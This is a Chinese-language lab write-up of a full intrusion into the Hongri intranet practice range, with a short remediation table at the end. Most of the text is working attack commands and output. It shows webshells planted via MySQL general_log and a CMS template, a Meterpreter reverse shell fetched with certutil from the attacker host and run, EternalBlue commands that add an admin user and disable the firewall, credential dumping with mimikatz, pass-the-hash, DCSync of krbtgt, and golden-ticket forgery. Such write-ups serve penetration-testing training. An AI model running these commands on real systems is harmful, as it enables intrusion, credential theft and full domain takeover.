# 红日靶场-WP-综合版

## 靶场信息

> 本文综合两套实战思路整理：\
> **路线一**：MSF 上线 → Stowaway 隧道 → migrate + kiwi 取凭据 → MS17-010 / PsExec 横向\
> **路线二**：双入口（phpMyAdmin general\_log + yxcms 后台）→ CS 上线 → fscan → MS17-010 command 模式
>
> 标注说明：✅ = 本文实测验证过；📖 = 转述自参考资料的标准做法

***

## 0. 环境准备

### 0.1 靶场组成

| 主机 | 角色 | 外网 IP | 内网 IP |
| --- | --- | --- | --- |
| Windows 7 x64 | 边界主机（Web 入口） | 192.168.31.131 / 192.168.0.110 | **192.168.52.143** |
| Windows Server 2008 R2 | **域控** + Exchange/OWA | — | **192.168.52.138** |
| Win2k3 (Metasploitable) | 成员服务器 | — | **192.168.52.141** |
| Kali | 攻击机 | 192.168.0.111 | — |

* 域名：`god.org`
* 三台虚拟机初始密码：`hongrisec@2019`
* Win7 为**双网卡**：桥接（外网）+ 仅主机（`192.168.52.0/24`）→ **天然跳板**

### 0.2 网络配置要点

```plain
VMware → 编辑 → 虚拟网络编辑器 → 添加网络
   子网 IP 设置为 192.168.52.0

三台靶机网卡模式统一设为该独立网卡
Win7 额外再加一张【桥接】网卡（供攻击机从外网访问）
```

靶机侧启动：`C:\phpStudy\phpStudy.exe`

> ⚠️ **Win7 需关闭防火墙**，否则外网扫不到端口。

***

## 1. 外网打点

### 1.1 端口与服务识别

```bash
nmap -sC -sV -p- 192.168.0.110
```

**关键发现**：80 端口是 **phpStudy 探针页**，且页面直接暴露：

| 泄露项                 | 值                 | 价值              |
| ------------------- | ----------------- | --------------- |
| 绝对路径                | `C:/phpStudy/WWW` | **★ 写马落点，无需爆破** |
| `disable_functions` | 空                 | 无函数黑名单          |
| 主机名                 | `STU1`            | —               |

### 1.2 目录枚举

```bash
dirsearch -u 192.168.0.110 -e * -x 300-399,400-499,500-599
# 或
ffuf -u http://192.168.0.110/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
```

**命中**：`/phpMyAdmin/`、`/phpinfo.php`、`/backup`（备份）、`/yxcms/`、`/shell.php`

> **判读技巧**：扫描结果中**响应大小完全相同的条目**通常是同一个默认页/错误页，先剔除再人工查看。

***

### 1.3 入口点一：phpMyAdmin general\_log 写马 ✅

#### 1.3.1 弱口令

```plain
URL  : http://192.168.0.110/phpMyAdmin/
账号 : root
口令 : root          ← 数据库账号密码均为 root
```

#### 1.3.2 先判断能不能用 `INTO OUTFILE`

> 📖 `OUTFILE`\*\* 写文件的四个前提\*\*（转述自参考资料）：
>
> 1. `magic_quotes_gpc = off`
> 2. 已知**绝对路径**
> 3. 数据库用户为 `root` 或具备 `FILE` 权限
> 4. `secure_file_priv`\*\* 不为 \*\*`null`（MySQL 5.6.34+ 默认为 `null`，直接封死）

逐条验证：

```sql
-- ① 当前用户是否有写权限（Y = 有）
SELECT group_concat(user, 0x3a, file_priv) FROM mysql.user;

-- ② secure_file_priv 状态
SHOW VARIABLES LIKE '%secure_file_priv%';
```

**本例结果**：`secure_file_priv` **已启用（非空）** → `INTO OUTFILE` 被拦：

```plain
#1290 - The MySQL server is running with the --secure-file-priv option
        so it cannot execute this statement
```

#### 1.3.3 绕过：general\_log 落盘

> **核心原理**：`secure_file_priv` **只约束 **`INTO OUTFILE`** / **`LOAD_FILE`，\
> **不约束日志文件的落盘路径**。而 `general_log` 会把**每一条 SQL 的原文**追加写入 `general_log_file`。

**利用条件**：① `magic_quotes_gpc = off` ② 已知绝对路径 ③ root / FILE 权限 ④ 能开启全局日志

```sql
-- ① 查看当前全局日志配置
SHOW VARIABLES LIKE '%general%';
--    general_log_file = C:\phpStudy\MySQL\data\stu1.log

-- ② 开启日志 + 改路径 + 写入木马 + 还原路径 + 关闭日志（一条龙）
SET GLOBAL general_log = ON;
SET GLOBAL general_log_file = 'C:\\phpStudy\\WWW\\shell.php';
SELECT "<?php eval($_POST['cmd']);?>";
SET GLOBAL general_log_file = 'C:\\phpStudy\\MySQL\\data\\stu1.log';
SET GLOBAL general_log = OFF;
```

> **为什么要还原路径并关日志**：不还原会**持续污染 Web 目录下的文件**；\
> 不关闭会让日志无限膨胀，是明显的攻击痕迹，也影响目标性能。

**连接后门**：

```plain
http://192.168.0.110/shell.php
POST: cmd=phpinfo();
```

✅ **本文实测**：用 base64 版木马 `<?php $z=$_REQUEST["z"];if($z){eval(base64_decode($z));}?>` 可得到不受引号/编码困扰的通用执行通道。

***

### 1.4 入口点二：yxcms 后台 GETSHELL ✅

> 📖 这是参考资料给出的**第二条入口**，与 general\_log 完全独立。

#### 1.4.1 从数据库发现线索

登录 phpMyAdmin 后，`SHOW DATABASES` 发现 `newyxcms` 库。

查看管理员表：

```sql
SELECT id, username, password FROM newyxcms.yx_admin;
```

```plain
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 168a73655bfecefdb15b14984dd2ad60 |
+----+----------+----------------------------------+
```

#### 1.4.2 破解密码（**关键：不是裸 MD5**）

在网上用 cmd5 直接查 `168a73655bfecefdb15b14984dd2ad60` 可能查不到 —— 因为 **yxcms 的密码算法是「MD5 截断后再 MD5」**。

✅ **本文从靶机源码中读到的算法**：

```php
// protected/apps/admin/controller/commonController.php
function newpwd($password) {
    return md5(substr(md5($password), 7, -9));
}
```

即：**取 **`md5(明文)`** 的第 8~16 位（共 16 字符），再对它做一次 MD5**。

手动验证：

```python
import hashlib
md5 = lambda s: hashlib.md5(s.encode()).hexdigest()

inner = md5("123456")            # e10adc3949ba59abbe56e057f20f883e
mid   = inner[7:-9]              # "949ba59abbe56e05"   ← 截断
print(md5(mid))                  # 168a73655bfecefdb15b14984dd2ad60  ★ 与目标一致
```

**结论：yxcms 后台口令为 **`admin`** / **`123456`**。**

> **踩坑记录**：直接用 hashcat `-m 0`（裸 MD5）跑 rockyou **一定破不出来**。\
> 必须先确认目标的**哈希算法**，再用对应的破解方式。

#### 1.4.3 定位后台并登录

```plain
目录扫描时未直接扫出后台 → 说明是【目录建站】

http://192.168.0.110/yxcms/               ← 站点存在
http://192.168.0.110/yxcms/index.php?r=admin   ← 后台
```

使用 `admin` / `123456` 登录。

#### 1.4.4 模板处写入后门

> yxcms 这类 CMS 的经典 getshell 点：**模板文件可编辑**。

在后台的**模板管理 / 视图文件**编辑处，写入：

```php
<?php eval($_POST['cmd']);?>
```

保存后，后门路径为：

```plain
http://192.168.0.110/yxcms/protected/apps/default/view/default/test.php
```

连接验证：

```bash
curl -s -X POST "http://192.168.0.110/yxcms/protected/apps/default/view/default/test.php" \
     -d "cmd=echo 'ok';"
```

***

## 2. 上线 Metasploit

### 2.1 生成 Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=192.168.0.111 LPORT=5555 \
         -f exe -o /var/www/html/shell.exe
```

> ⚠️ **payload 与 handler 必须完全一致**。\
> 参考资料里出现 `msfvenom -p windows/meterpreter_reverse_tcp` 配 `set payload windows/x64/meterpreter/reverse_tcp`\
> —— 这两者（x86 stageless / x64 staged）**不匹配**，实际使用时务必改成一致。

### 2.2 启动监听

```plain
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.0.111
msf6 exploit(multi/handler) > set lport 5555
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > run -j
```

### 2.3 投放并上线

通过 WebShell（蚁剑虚拟终端）执行：

```plain
certutil -urlcache -split -f http://192.168.0.111/shell.exe C:\phpStudy\WWW\shell.exe
C:\phpStudy\WWW\shell.exe
```

**上线标志**：

```plain
[*] Meterpreter session 1 opened (192.168.0.111:5555 -> 192.168.31.131:xxxxx)
meterpreter > getuid
Server username: GOD\administrator
```

### 2.4 控制台乱码处理

```plain
msf6 > setg ConsoleLogging false
```

或在 **msfconsole 设置里把编码切到 UTF-8**，否则中文回显为乱码。

***

## 3. 内网信息收集

### 3.1 网络与域信息

```plain
meterpreter > ipconfig
meterpreter > route
meterpreter > run post/windows/gather/enum_domain
meterpreter > run post/windows/gather/enum_logged_on_users
```

**判断依据**：出现 `192.168.52.x` 网卡 → **该机是内网跳板**。

### 3.2 fscan 一把梭（📖 参考资料的推荐做法）

```plain
.\fscan64.exe -h 192.168.52.0/24
```

**一个 exe 同时完成**：主机存活 + 端口扫描 + 服务识别 + **常见漏洞探测（含 MS17-010）** + 弱口令爆破。

> **优势**：比手工 `fsockopen` 逐个端口探测快一个数量级，且能直接标出可利用漏洞。

### 3.3 判定域控

| 主机 | 开放端口 | 判读 |
| --- | --- | --- |
| **192.168.52.138** | 53, 80, **88**, 135, 139, **389**, 445, **636** | **域控**（Kerberos + LDAP + DNS + LDAPS） |
| 192.168.52.141 | 21, 135, 139, 445, 1025 | Windows 2003 特征 |

**域内主机确认**：

```plain
域控 OWA          : 192.168.52.138
ROOT-TVI862UBEH   : 192.168.52.141
边界主机 STU1     : 192.168.52.143
```

***

## 4. 隧道搭建（Stowaway）

> 攻击机在 `192.168.0.0/24`，**无法直达** `192.168.52.0/24`，必须经边界主机转发。

### 4.1 攻击机（服务端）

```plain
windows_x64_admin.exe -l 6666
# 或带密码：admin.exe -l 2222 -s websec
```

### 4.2 边界主机（客户端）

```plain
windows_x64_agent.exe -c 192.168.0.111:6666 --reconnect 10
# 或：agent.exe -c 192.168.2.127:2222 -s websec --reconnect 10
```

### 4.3 开启 socks 代理

在 **admin 控制台**中：

```plain
>> use 0
>> socks 7777
```

### 4.4 配置 proxychains

```bash
vim /etc/proxychains4.conf
# 末尾加入：
socks5  127.0.0.1  7777
```

**验证**：

```bash
proxychains4 nmap -Pn -sT -p 88,389,445 192.168.52.138
```

> ⚠️ 必须用 `-sT`（TCP connect），`proxychains` 不支持 SYN 扫描。

> 📖 **ProxyBridge**（参考资料提到）：可将**指定软件的流量**自动转发到代理端口，\
> 免去逐个配置 proxychains 的麻烦，适合穿透场景。

***

## 5. 提权与凭据提取

### 5.1 提权到 SYSTEM

```plain
meterpreter > getuid
Server username: GOD\administrator     ← 当前身份

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM   ← Windows 最高权限
```

### 5.2 ⚠️ 关键坑：hashdump 报错 → 进程迁移

```plain
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: The parameter is incorrect.
```

> 📖 **原因**（参考资料明确指出）：\
> **目标 Win7 是 64 位，而 Meterpreter 会话是 32 位**（由 32 位 PHP 拉起），\
> 受 **WOW64 重定向**约束，**32 位进程无法读取 64 位 lsass 的完整内存**。

**解法：迁移到 64 位进程**

```plain
meterpreter > ps
 PID   Name              Arch  Session  User
 ----  ----------------  ----  -------  ----
 492   svchost.exe       x64   0        NT AUTHORITY\SYSTEM   ← 选一个 64 位进程
 ...

meterpreter > migrate 492
[*] Migrating from 1234 to 492...
[*] Migration completed successfully.

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:794adae2ad271e3a7bba23288c7d4702:::
Guest:501:...
liukaifeng01:1000:...
```

> **选择迁移目标的建议**：优先选 **同权限或更高权限**、**架构为 x64**、**稳定不退出**的进程\
> （如 `svchost.exe`、`lsass.exe` 不推荐、`explorer.exe` 若无用户登录则不稳）。

### 5.3 提取明文口令（kiwi）

```plain
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 (x64/windows)
Success.

meterpreter > creds_all
msv credentials
===============
Username       Domain   NTLM
--------       ------   ----
Administrator  GOD      794adae2ad271e3a7bba23288c7d4702

wdigest credentials
===================
Username       Domain   Password
--------       ------   --------
Administrator  GOD      hongrisec@2019      ← ★★ 明文口令
```

> ✅ **Win7 / 2008 R2 默认开启 WDigest**，因此 LSASS 中**缓存明文口令**。\
> Windows 8.1 / 2012 R2 之后默认关闭，只能拿到哈希。

### 5.4 确认权限级别

```plain
meterpreter > shell
C:\> whoami /groups | findstr /i "Domain Admins"
GOD\Domain Admins    组    S-1-5-21-2952760202-1353902439-2381784089-512
```

**确认 **`Administrator`** 是域管理员** → 该凭据可用于域内任意主机的横向。

***

## 6. 横向移动

### 6.1 方案一：MS17-010（永恒之蓝）

```plain
proxychains msfconsole
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOSTS 192.168.52.138
msf6 exploit(...) > set proxies socks5:127.0.0.1:7777
msf6 exploit(...) > setg reverseAllowProxy true
msf6 exploit(...) > exploit
```

> ⚠️ `setg reverseAllowProxy true`：允许 payload 通过代理回连。\
> 不加这个参数，内网主机无法把 shell 弹回攻击机。

\***� 参考资料记录的失败经验**：

> EternalBlue 漏洞利用阶段成功，但 **Meterpreter stage 死掉** ——\
> **内网代理环境下 staged payload 不稳定**，因此改用已获取的域管凭据通过 PsExec 横向移动。

**✅**\*\* 更好的解法：用 **`command`** 模式（无 payload）\*\*

```plain
msf6 > use auxiliary/admin/smb/ms17_010_command
msf6 auxiliary(admin/smb/ms17_010_command) > set RHOSTS 192.168.52.138
msf6 auxiliary(admin/smb/ms17_010_command) > set COMMAND net user websec admin@123 /add
msf6 auxiliary(admin/smb/ms17_010_command) > set COMMAND net localgroup Administrators websec /add
msf6 auxiliary(admin/smb/ms17_010_command) > set COMMAND 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'
msf6 auxiliary(admin/smb/ms17_010_command) > set COMMAND netsh firewall set opmode disable
msf6 auxiliary(admin/smb/ms17_010_command) > run
```

> **为什么这个思路更好**：`ms17_010_command` **只执行一条命令，不需要反弹 payload** ——\
> 完全绕开了「代理环境下 stage 死掉」的问题。**在隧道穿透场景下这是首选。**

**命令序列的作用**：

| 命令 | 目的 |
| --- | --- |
| `net user websec admin@123 /add` | 新建账号 |
| `net localgroup Administrators websec /add` | 加入管理员组 |
| `REG ADD ... fDenyTSConnections ... 0` | **开启 3389 远程桌面** |
| `netsh firewall set opmode disable` | 关闭防火墙 |

### 6.2 方案二：PsExec + 域管凭据

```bash
proxychains4 impacket-psexec GOD/Administrator:'hongrisec@2019'@192.168.52.138
```

成功标志：

```plain
[*] Requesting shares on 192.168.52.138.....
[*] Found writable share ADMIN$
[*] Uploading file xxxxx.exe
[*] Creating service xxxxx ...
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32> whoami
nt authority\system                ← 域控 SYSTEM 权限
```

**或走 MSF 模块**：

```plain
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.52.138
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBDomain GOD
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:794adae2ad271e3a7bba23288c7d4702
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/bind_tcp
msf6 exploit(windows/smb/psexec) > run
```

> `SMBPass` 填 `LM:NT` 格式即可实现 **Pass-the-Hash**。

### 6.3 结果

| 主机 | 方法 | 获得身份 |
| --- | --- | --- |
| 192.168.52.138 (OWA) | MS17-010 / PsExec | `NT AUTHORITY\SYSTEM` |
| 192.168.52.141 (ROOT-TVI862UBEH) | PsExec | `NT AUTHORITY\SYSTEM` |

```plain
meterpreter > sessions -l
Id  Name  Type                     Information                        Connection
--  ----  ----                     -----------                        ----------
1         meterpreter x86/windows  GOD\administrator @ STU1           ...
2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ OWA          ...
3         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ROOT-TVI86... ...
```

***

## 7. 域控接管与凭据固化

### 7.1 确认域控身份

```plain
meterpreter > sysinfo
Computer : OWA
OS       : Windows Server 2008 R2 (6.1 Build 7601, Service Pack 1)
Domain   : GOD
```

```plain
net view \\192.168.52.138
→ NETLOGON  Disk     ← ★ 域控标志
→ SYSVOL    Disk     ← ★ 域控标志
```

### 7.2 导出全部域哈希

**方式一：DCSync（推荐）**

```plain
meterpreter > load kiwi
meterpreter > dcsync_ntlm krbtgt
[+] Account   : krbtgt
[+] NTLM Hash : 58e91a5ac358d86513ab224312314061
[+] SID       : S-1-5-21-2952760202-1353902439-2381784089-502
```

**方式二：ntdsutil IFM 导出**（`ntds.dit` 被 AD 独占锁定，需卷影快照绕过）

```plain
ntdsutil "ac i ntds" "ifm" "create full c:\windows\temp\ifm" q q
```

**方式三：**`smart_hashdump`（在域控会话上运行会自动切换到 DCSync）

```plain
msf6 > use post/windows/gather/smart_hashdump
msf6 post(windows/gather/smart_hashdump) > set SESSION 2
msf6 post(windows/gather/smart_hashdump) > run
[*] Domain Controller detected — dumping using DCSync
```

### 7.3 导出结果 ✅

```plain
Administrator     : 794adae2ad271e3a7bba23288c7d4702
Guest             : 31d6cfe0d16ae931b73c59d7e0c089c0   ← 空口令
liukaifeng01      : 794adae2ad271e3a7bba23288c7d4702
OWA$              : 50f642c70bb9141fe2805f0c14aaa9ac   ← 机器账户
krbtgt            : 58e91a5ac358d86513ab224312314061   ← ★★ 黄金票据密钥
ROOT-TVI862UBEH$  : dc5622dddc2f59a6d5f73bbc2df6f809
STU1$             : 80b176b47f8c6451817951e12da9f37f
god.org\ligang    : 1e3d22f88dfd250c9312d21686c60f41
DEV1$             : bed18e5b9d13bb384a3041a10d43c01b
```

### 7.4 伪造黄金票据（可选，权限固化）

```plain
meterpreter > golden_ticket_create -d god.org \
    -s S-1-5-21-2952760202-1353902439-2381784089 \
    -k 58e91a5ac358d86513ab224312314061 \
    -u Administrator -t /tmp/golden.kirbi

meterpreter > kerberos_ticket_use /tmp/golden.kirbi
meterpreter > shell
C:\> dir \\owa.god.org\c$
```

> **为什么「改密码也没用」**：域控验证 TGT 用的是 `krbtgt` 密钥，\
> 而我们**自己就有这把密钥** → 能签出域控认可的任意票据，**不依赖被伪造用户的密码**。\
> **唯一补救：重置 **`krbtgt`** 口令两次**（间隔 ≥10 小时）。

***

## 8. 关键判据与踩坑汇总

### 8.1 判据速查

| 目标 | 判据 | 位置 |
| --- | --- | --- |
| phpMyAdmin 登录成功 | 响应含 `main.php` / 标题含 `phpStudy` | 跟随跳转后的响应体 |
| phpMyAdmin（302 层面） | `pmaUser-1` 与 `pmaPass-1` **值相同** | 302 响应头 |
| 静态资源 200/404 | **响应大小相同的一组 = 同一个页面** | 扫描结果 |
| `OUTFILE` 可用性 | `secure_file_priv` 为**空** | `SHOW VARIABLES` |
| yxcms 密码算法 | `md5(substr(md5(pwd),7,-9))` | 源码 `newpwd()` |
| 域控识别 | 88 + 389 + 53 + 636；`NETLOGON`/`SYSVOL` | 端口 + 共享 |
| 空口令 | NTLM = `31d6cfe0d16ae931b73c59d7e0c089c0` | 哈希 |
| 会话位数问题 | `sysinfo` 显示 x64 但 `Meterpreter: x86` | 会话信息 |

### 8.2 四个典型坑

| # | 坑 | 现象 | 解法 |
| --- | --- | --- | --- |
| 1 | **Burp 未处理重定向 Cookie** | 爆破结果全部失败 | 勾选 `Process cookies in redirects` |
| 2 | **32 位会话读不到 64 位 lsass** | `hashdump` / `kiwi` 报错 | `ps` → `migrate <64位进程PID>` |
| 3 | **代理环境下 staged payload 死掉** | 漏洞利用成功但收不到 shell | 改用 `ms17_010_command`（只执行命令，无 payload） |
| 4 | **yxcms 用裸 MD5 爆破不出** | rockyou 跑完无结果 | 算法是 `md5(substr(md5(pwd),7,-9))`，需先读源码 |

***

## 9. 修复建议

| # | 风险 | 等级 | 修复建议 |
| --- | --- | --- | --- |
| R1 | phpMyAdmin 弱口令 `root/root` 暴露外网 | 🔴 严重 | 强口令 + 限制来源 IP + 禁止外网访问 |
| R2 | MySQL `secure_file_priv` 放行 + Web 目录可写 | 🔴 严重 | 设 `secure_file_priv` 为固定不可写目录；MySQL 用独立低权限账号 |
| R3 | `general_log` 可随意图改路径并落盘 Web 根 | 🔴 严重 | 日志目录移出 Web 根；限制 `SET GLOBAL` 权限 |
| R4 | **yxcms 后台弱口令 **`admin/123456`** + 模板可写** | 🔴 严重 | 强口令；禁止后台编辑模板；升级 CMS |
| R5 | phpStudy 探针 / phpinfo 对公网暴露 | 🟠 高 | 删除 `l.php`、`phpinfo.php` |
| R6 | Win7/2008R2 **WDigest 明文缓存** | 🟠 高 | 注册表 `UseLogonCredential = 0` |
| R7 | 未打 MS17-010 补丁 | 🟠 高 | 安装 MS17-010；**禁用 SMBv1** |
| R8 | 域管账号可登录普通业务机 | 🟠 高 | 域管加入 **Protected Users** 组；实施分层管理 |
| R9 | `krbtgt` 已泄露 | 🔴 严重 | **重置 krbtgt 口令两次**（间隔 ≥10 小时） |
| R10 | 本机 Administrator 空口令 | 🟠 高 | 设强口令，启用 LAPS |

***

## 10. 附录：命令速查

### SQL

```sql
-- 环境探测
SELECT group_concat(user,0x3a,file_priv) FROM mysql.user;
SHOW VARIABLES LIKE '%secure_file_priv%';
SHOW VARIABLES LIKE '%general%';

-- general_log 写马（一条龙）
SET GLOBAL general_log = ON;
SET GLOBAL general_log_file = 'C:\\phpStudy\\WWW\\shell.php';
SELECT "<?php eval($_POST['cmd']);?>";
SET GLOBAL general_log_file = 'C:\\phpStudy\\MySQL\\data\\stu1.log';
SET GLOBAL general_log = OFF;
```

### MSF

```plain
use exploit/multi/handler                      # 监听
use auxiliary/admin/smb/ms17_010_command       # 永恒之蓝（命令模式，推荐）
use exploit/windows/smb/ms17_010_eternalblue   # 永恒之蓝（payload 模式）
use exploit/windows/smb/psexec                 # PsExec 横向
use auxiliary/scanner/portscan/tcp             # 端口扫描
use auxiliary/server/socks_proxy               # SOCKS 代理
post/windows/gather/smart_hashdump             # 域控自动 DCSync
post/windows/manage/migrate                    # 进程迁移
```

### Meterpreter / kiwi

```plain
getsystem                      # 提权
ps / migrate <PID>             # 进程迁移（解决 32/64 位问题）
hashdump                       # 导哈希
load kiwi                      # 加载 mimikatz
creds_all                      # 所有凭据（含明文）
lsa_dump_sam                   # 本机 SAM
dcsync_ntlm krbtgt             # DCSync
golden_ticket_create           # 伪造黄金票据
kerberos_ticket_use <file>     # 票据注入
```

***

*Writeup 结束*
